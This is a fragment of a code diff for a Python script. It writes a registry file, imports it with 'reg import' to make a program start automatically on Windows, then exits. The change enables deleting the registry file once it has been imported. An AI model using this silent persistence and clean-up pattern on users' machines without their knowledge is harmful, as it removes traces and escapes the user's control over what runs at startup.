@@ -102,7 +102,7 @@ if not os.path.exists(os.environ["APPDATA"]+"/"+program):
     f.close()
     os.system("reg import {}".format(os.environ["TEMP"]+"/autostart.reg"))
     time.sleep(3)
-    #os.unlink(os.environ["TEMP"]+"/autostart.reg")
+    os.unlink(os.environ["TEMP"]+"/autostart.reg")
     sys.exit(0)
 
 define_caption()
